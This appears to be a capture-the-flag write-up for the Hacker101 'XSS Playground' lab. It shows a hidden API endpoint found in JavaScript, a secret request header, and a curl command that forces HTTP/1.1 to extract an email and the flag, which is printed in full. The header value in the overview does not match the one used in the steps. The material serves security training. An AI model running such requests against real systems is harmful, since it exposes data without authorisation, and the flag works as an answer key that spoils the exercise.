
# 💉 XSS Playground — zseano

> **Platform:** Hacker101 CTF &nbsp;|&nbsp; **Difficulty:** Moderate &nbsp;|&nbsp; **Flags:** Multiple (XSS + Data Leak)

---

## ⛓️ Attack Chain

```
Source review → custom.js analysis → find /api/action.php?act=getemail → detect required header → HTTP/2 header normalization issue → force HTTP/1.1 → extract email → retrieve flag
```

---

## 🔍 Application Overview

Multiple XSS vectors exist:

- Reflected XSS
- Stored XSS
- DOM-based XSS
- CSP restricted context
- Hidden API endpoint inside JavaScript

Hidden endpoint:

```
/api/action.php?act=getemail
```

Requires strict header:

```
X-SAFEPROTECTION: enNlYW5vb2Vjb3Vyc2U=
```

---

## 🚩 Exploit

### Step 1 — Find endpoint

Located inside `custom.js`:

```
/api/action.php?act=getemail
```

### Step 2 — Required header

```
X-SAFEPROTECTION: enNlYW5vb2Vjb3U=
```

### Step 3 — Issue

- Burp changes header casing → blocked
- HTTP/2 normalizes headers → blocked

### Step 4 — Bypass with HTTP/1.1

```bash
curl -H "X-SAFEPROTECTION: enNlYW5vb2Vjb3U=" --http1.1 \
  "https://LABURL/api/action.php?act=getemail"
```

### Step 5 — Response

```json
{
  "email": "zseano@ofcourse.com",
  "flag": "^FLAG^7cf095fe3d1562a95054dedcf6960eb68559619fb3357bdf8d6ddb8b1411e6f4"
}
```

### Step 6 — Final flag

```
^FLAG^7cf095fe3d1562a95054dedcf6960eb68559619fb3357bdf8d6ddb8b1411e6f4$
```

---

## 🧠 Lessons

- HTTP/2 breaks header-case assumptions
- Security headers must not rely on casing
- Sensitive endpoints must not be exposed in JS
- Proxies can silently modify requests

---
